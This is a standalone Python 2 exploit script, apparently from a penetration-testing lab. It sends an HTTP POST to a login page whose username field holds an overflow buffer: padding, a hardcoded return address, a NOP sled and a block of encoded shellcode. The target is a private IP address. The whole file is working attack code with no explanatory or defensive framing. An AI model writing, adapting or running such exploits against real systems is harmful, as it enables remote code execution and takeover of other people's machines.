#!/usr/bin/python2

import socket
import sys

host = "192.168.70.137"
port = 80

shellcode = (
"\xbd\xb8\xef\xd9\xdb\xdb\xcd\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x6b\x12\x03\x6b\x12\x83\x53\x13\x3b\x2e\x5f\x04\x3e"
"\xd1\x9f\xd5\x5f\x5b\x7a\xe4\x5f\x3f\x0f\x57\x50\x4b\x5d\x54"
"\x1b\x19\x75\xef\x69\xb6\x7a\x58\xc7\xe0\xb5\x59\x74\xd0\xd4"
"\xd9\x87\x05\x36\xe3\x47\x58\x37\x24\xb5\x91\x65\xfd\xb1\x04"
"\x99\x8a\x8c\x94\x12\xc0\x01\x9d\xc7\x91\x20\x8c\x56\xa9\x7a"
"\x0e\x59\x7e\xf7\x07\x41\x63\x32\xd1\xfa\x57\xc8\xe0\x2a\xa6"
"\x31\x4e\x13\x06\xc0\x8e\x54\xa1\x3b\xe5\xac\xd1\xc6\xfe\x6b"
"\xab\x1c\x8a\x6f\x0b\xd6\x2c\x4b\xad\x3b\xaa\x18\xa1\xf0\xb8"
"\x46\xa6\x07\x6c\xfd\xd2\x8c\x93\xd1\x52\xd6\xb7\xf5\x3f\x8c"
"\xd6\xac\xe5\x63\xe6\xae\x45\xdb\x42\xa5\x68\x08\xff\xe4\xe4"
"\xfd\x32\x16\xf5\x69\x44\x65\xc7\x36\xfe\xe1\x6b\xbe\xd8\xf6"
"\x8c\x95\x9d\x68\x73\x16\xde\xa1\xb0\x42\x8e\xd9\x11\xeb\x45"
"\x19\x9d\x3e\xc9\x49\x31\x91\xaa\x39\xf1\x41\x43\x53\xfe\xbe"
"\x73\x5c\xd4\xd6\x1e\xa7\xbf\x18\x76\xe1\xbc\xf1\x85\xed\xd3"
"\x5d\x03\x0b\xb9\x4d\x45\x84\x56\xf7\xcc\x5e\xc6\xf8\xda\x1b"
"\xc8\x73\xe9\xdc\x87\x73\x84\xce\x70\x74\xd3\xac\xd7\x8b\xc9"
"\xd8\xb4\x1e\x96\x18\xb2\x02\x01\x4f\x93\xf5\x58\x05\x09\xaf"
"\xf2\x3b\xd0\x29\x3c\xff\x0f\x8a\xc3\xfe\xc2\xb6\xe7\x10\x1b"
"\x36\xac\x44\xf3\x61\x7a\x32\xb5\xdb\xcc\xec\x6f\xb7\x86\x78"
"\xe9\xfb\x18\xfe\xf6\xd1\xee\x1e\x46\x8c\xb6\x21\x67\x58\x3f"
"\x5a\x95\xf8\xc0\xb1\x1d\x08\x8b\x9b\x34\x81\x52\x4e\x05\xcc"
"\x64\xa5\x4a\xe9\xe6\x4f\x33\x0e\xf6\x3a\x36\x4a\xb0\xd7\x4a"
"\xc3\x55\xd7\xf9\xe4\x7f"
)

return_address = "\x83\x0c\x09\x10" # 10090c83
nops_sled = "\x90" * 20
crash = "A" * 780 + return_address + nops_sled + shellcode

fuzzer="username="+crash+"&password=A"

payload="POST /login HTTP/1.1\r\n"
payload+="Host: 192.168.70.131\r\n"
payload+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
payload+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
payload+="Accept-Language: en-US,en;q=0.5\r\n"
payload+="Referer: http://192.168.70.131/login\r\n"
payload+="Connection: close\r\n"
payload+="Content-Type: application/x-www-form-urlencoded\r\n"
payload+="Content-Length: "+str(len(fuzzer))+"\r\n"
payload+="\r\n"
payload+=fuzzer

try:
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        s.send(payload)
        print("[+] Sending Exploits!")
        print("[+] Done")
        s.close()
except:
        print("Host is Unreachable")
        sys.exit()
